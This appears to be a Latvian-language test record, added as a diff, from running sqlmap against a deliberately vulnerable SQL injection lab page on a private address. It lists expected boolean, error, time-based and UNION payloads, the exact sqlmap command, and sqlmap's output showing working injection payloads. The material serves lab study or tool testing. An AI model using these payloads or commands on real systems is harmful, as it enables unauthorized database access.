@@ -1,0 +1,40 @@
+=================================================================================
+1. Īpašība: parameters satur nevis lietotājvārdu, bet daļu no vaicājuma, kas atlasa lietotājvārdu
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?req=username%3d%27hacker%27 or 1=1
+3.2. error-based: ?req=username%3d%27hacker%27%27
+3.3. time-based: ?req=username%3d%27hacker%27 or sleep(5)
+3.4. union: ?req=username%3d%27hacker%27 union select 1,2,3
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 10071912 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://192.168.17.134/sqlinjection/example4/?req=username%3d%27hacker%27" -p req --risk=3 --level=5
+
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameter 'req' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+---
+Parameter: req (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: req=username='hacker' AND 9333=9333
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: req=username='hacker' AND (SELECT 1429 FROM(SELECT COUNT(*),CONCAT(0x71626a7071,(SELECT (ELT(1429=1429,1))),0x7176706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: req=username='hacker' OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: req=username='hacker' UNION ALL SELECT CONCAT(0x71626a7071,0x6956786e416d706f5967634f514f6c4454744f7550445a6a745644617a6c5456436170756d446369,0x7176706a71),NULL,NULL-- -
+---
+web server operating system: Linux Debian 6 (squeeze)
+web application technology: Apache 2.2.16
+back-end DBMS: MySQL >= 5.0
